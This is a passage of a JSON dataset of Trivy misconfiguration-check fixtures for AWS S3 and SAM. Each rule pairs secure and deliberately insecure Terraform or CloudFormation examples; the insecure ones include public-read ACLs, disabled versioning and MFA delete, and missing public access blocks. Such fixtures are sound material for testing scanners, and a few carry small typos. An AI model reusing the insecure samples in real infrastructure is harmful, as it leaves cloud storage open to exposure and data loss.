        "rule_id": "AWS-S3-ENABLE_OBJECT_WRITE_LOGGING",
        "title": "Enable Object Write Logging",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"WriteOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"WriteOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"ReadOnly\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3\"]\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"my-bucket\"\n      }\n\n      resource \"aws_cloudtrail\" \"example\" {\n        event_selector {\n          read_write_type = \"All\"\n          data_resource {\n            type   = \"AWS::S3::Object\"\n            values = [\"arn:aws:s3:::test-bucket/\"]\n          }\n        }\n      }\n",
        "file_name": "enable_object_write_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_object_write_logging.yaml",
        "local_path": "aws/s3/enable_object_write_logging.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"WriteOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"WriteOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::${aws_s3_bucket.good_example.bucket}/\"]\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"ReadOnly\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3\"]\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"my-bucket\"\n}\n\nresource \"aws_cloudtrail\" \"example\" {\n  event_selector {\n    read_write_type = \"All\"\n    data_resource {\n      type   = \"AWS::S3::Object\"\n      values = [\"arn:aws:s3:::test-bucket/\"]\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_VERSIONING",
        "title": "Enable Versioning",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            VersioningConfiguration:\n              Status: Enabled\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        versioning {\n          enabled = true\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n        versioning_configuration {\n          status = \"Enabled\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        versioning {\n          enabled = false\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n        versioning_configuration {\n          status = \"Disabled\"\n        }\n      }\n",
        "file_name": "enable_versioning.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_versioning.yaml",
        "local_path": "aws/s3/enable_versioning.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      VersioningConfiguration:\n        Status: Enabled"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  versioning {\n    enabled = true\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n  versioning_configuration {\n    status = \"Enabled\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  versioning {\n    enabled = false\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n  versioning_configuration {\n    status = \"Disabled\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketEncryption:\n              ServerSideEncryptionConfiguration:\n                - BucketKeyEnabled: true\n                  ServerSideEncryptionByDefault:\n                    KMSMasterKeyID: kms-arn\n                    SSEAlgorithm: aws:kms\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketEncryption:\n              ServerSideEncryptionConfiguration:\n                - BucketKeyEnabled: false\n                  ServerSideEncryptionByDefault:\n                    SSEAlgorithm: AES256\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption\n  good:\n    - |-\n      resource \"aws_kms_key\" \"mykey\" {}\n\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            kms_master_key_id = aws_kms_key.mykey.arn\n            sse_algorithm     = \"aws:kms\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        # server access logging bucket\n        acl    = \"log-delivery-write\"\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_kms_key\" \"good_example\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n\n        # deprecated way\n        server_side_encryption_configuration {\n          rule {\n            apply_server_side_encryption_by_default {\n              kms_master_key_id = aws_kms_key.example.arn\n              sse_algorithm     = \"aws:kms\"\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"log-bucket\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"log_acl\" {\n        bucket = aws_s3_bucket.good_example.id\n        access_control_policy {\n\n          grant {\n            grantee {\n              type = \"Group\"\n              uri  = \"http://acs.amazonaws.com/groups/s3/LogDelivery\"\n            }\n            permission = \"WRITE\"\n          }\n\n          owner {\n            id = data.aws_canonical_user_id.current.id\n          }\n        }\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"log-policy-bucket\"\n      }\n\n      resource \"aws_s3_bucket_policy\" \"log_policy\" {\n        bucket = aws_s3_bucket.good_example.id\n        policy = jsonencode({\n          Version = \"2012-10-17\"\n          Statement = [{\n            Effect = \"Allow\"\n            Principal = {\n              Service = \"logging.s3.amazonaws.com\"\n            }\n            Action   = \"s3:PutObject\"\n            Resource = \"arn:aws:s3:::log-policy-bucket/logs/*\"\n          }]\n        })\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            sse_algorithm = \"AES256\"\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_exampl\" {\n        bucket = \"mybucket\"\n\n        # deprecated way\n        server_side_encryption_configuration {\n          rule {\n            apply_server_side_encryption_by_default {\n              sse_algorithm = \"AES256\"\n            }\n          }\n        }\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/encryption_customer_key.yaml",
        "local_path": "aws/s3/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - BucketKeyEnabled: true\n            ServerSideEncryptionByDefault:\n              KMSMasterKeyID: kms-arn\n              SSEAlgorithm: aws:kms"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketEncryption:\n        ServerSideEncryptionConfiguration:\n          - BucketKeyEnabled: false\n            ServerSideEncryptionByDefault:\n              SSEAlgorithm: AES256"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption"
            ],
            "good": [
              "resource \"aws_kms_key\" \"mykey\" {}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      kms_master_key_id = aws_kms_key.mykey.arn\n      sse_algorithm     = \"aws:kms\"\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  # server access logging bucket\n  acl    = \"log-delivery-write\"\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}",
              "resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n\n  # deprecated way\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        kms_master_key_id = aws_kms_key.example.arn\n        sse_algorithm     = \"aws:kms\"\n      }\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"log-bucket\"\n}\n\nresource \"aws_s3_bucket_acl\" \"log_acl\" {\n  bucket = aws_s3_bucket.good_example.id\n  access_control_policy {\n\n    grant {\n      grantee {\n        type = \"Group\"\n        uri  = \"http://acs.amazonaws.com/groups/s3/LogDelivery\"\n      }\n      permission = \"WRITE\"\n    }\n\n    owner {\n      id = data.aws_canonical_user_id.current.id\n    }\n  }\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"log-policy-bucket\"\n}\n\nresource \"aws_s3_bucket_policy\" \"log_policy\" {\n  bucket = aws_s3_bucket.good_example.id\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect = \"Allow\"\n      Principal = {\n        Service = \"logging.s3.amazonaws.com\"\n      }\n      Action   = \"s3:PutObject\"\n      Resource = \"arn:aws:s3:::log-policy-bucket/logs/*\"\n    }]\n  })\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"sse_config\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n  }\n}",
              "resource \"aws_s3_bucket\" \"bad_exampl\" {\n  bucket = \"mybucket\"\n\n  # deprecated way\n  server_side_encryption_configuration {\n    rule {\n      apply_server_side_encryption_by_default {\n        sse_algorithm = \"AES256\"\n      }\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-IGNORE_PUBLIC_ACLS",
        "title": "Ignore Public Acls",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n            PublicAccessBlockConfiguration:\n              IgnorePublicAcls: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        ignore_public_acls = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        ignore_public_acls = false\n      }\n",
        "file_name": "ignore_public_acls.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/ignore_public_acls.yaml",
        "local_path": "aws/s3/ignore_public_acls.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n      PublicAccessBlockConfiguration:\n        IgnorePublicAcls: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#ignore_public_acls"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  ignore_public_acls = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n}",
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  ignore_public_acls = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-NO_PUBLIC_ACCESS_WITH_ACL",
        "title": "No Public Access With Acl",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: AuthenticatedRead\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        acl = \"private\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n        acl    = \"private\"\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        acl = \"public-read\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"yournamehere\"\n      }\n\n      resource \"aws_s3_bucket_acl\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n        acl    = \"authenticated-read\"\n      }\n",
        "file_name": "no_public_access_with_acl.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/no_public_access_with_acl.yaml",
        "local_path": "aws/s3/no_public_access_with_acl.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: AuthenticatedRead"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  acl = \"private\"\n}",
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_acl\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n  acl    = \"private\"\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  acl = \"public-read\"\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"yournamehere\"\n}\n\nresource \"aws_s3_bucket_acl\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n  acl    = \"authenticated-read\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-NO_PUBLIC_BUCKETS",
        "title": "No Public Buckets",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            PublicAccessBlockConfiguration:\n              RestrictPublicBuckets: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets\u00a1\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        restrict_public_buckets = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n\n        restrict_public_buckets = false\n      }\n",
        "file_name": "no_public_buckets.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/no_public_buckets.yaml",
        "local_path": "aws/s3/no_public_buckets.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      PublicAccessBlockConfiguration:\n        RestrictPublicBuckets: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#restrict_public_buckets\u00a1"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket = aws_s3_bucket.good_example.id\n\n  restrict_public_buckets = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket = aws_s3_bucket.bad_example.id\n\n  restrict_public_buckets = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-REQUIRE_MFA_DELETE",
        "title": "Require Mfa Delete",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_versioning\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"good_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        versioning_configuration {\n          status     = \"Enabled\"\n          mfa_delete = \"Enabled\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"bucket\"\n      }\n\n      resource \"aws_s3_bucket_versioning\" \"good_example\" {\n        bucket = aws_s3_bucket.example.id\n\n        versioning_configuration {\n          status     = \"Enabled\"\n          mfa_delete = \"Disabled\"\n        }\n      }\n",
        "file_name": "require_mfa_delete.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/require_mfa_delete.yaml",
        "local_path": "aws/s3/require_mfa_delete.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_versioning"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  versioning_configuration {\n    status     = \"Enabled\"\n    mfa_delete = \"Enabled\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"bucket\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id\n\n  versioning_configuration {\n    status     = \"Enabled\"\n    mfa_delete = \"Disabled\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-SPECIFY_PUBLIC_ACCESS_BLOCK",
        "title": "Specify Public Access Block",
        "provider": "aws",
        "service": "s3",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: Private\n            PublicAccessBlockConfiguration:\n              BlockPublicAcls: true\n              BlockPublicPolicy: true\n              IgnorePublicAcls: true\n              RestrictPublicBuckets: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            AccessControl: AuthenticatedRead\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"private-read\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"example\" {\n        bucket              = aws_s3_bucket.example.id\n        block_public_acls   = true\n        block_public_policy = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"example\"\n        acl    = \"private-read\"\n      }\n",
        "file_name": "specify_public_access_block.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/specify_public_access_block.yaml",
        "local_path": "aws/s3/specify_public_access_block.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: true\n        BlockPublicPolicy: true\n        IgnorePublicAcls: true\n        RestrictPublicBuckets: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: AuthenticatedRead"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#bucket"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"private-read\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"example\" {\n  bucket              = aws_s3_bucket.example.id\n  block_public_acls   = true\n  block_public_policy = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"example\"\n  acl    = \"private-read\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-API_USE_SECURE_TLS_POLICY",
        "title": "Api Use Secure Tls Policy",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Domain:\n              SecurityPolicy: TLS_1_2\n            Name: Good SAM API example\n            StageName: Prod\n            TracingEnabled: false\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n            TracingEnabled: false\n",
        "file_name": "api_use_secure_tls_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/api_use_secure_tls_policy.yaml",
        "local_path": "aws/sam/api_use_secure_tls_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Domain:\n        SecurityPolicy: TLS_1_2\n      Name: Good SAM API example\n      StageName: Prod\n      TracingEnabled: false"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod\n      TracingEnabled: false"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_API_ACCESS_LOGGING",
        "title": "Enable Api Access Logging",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
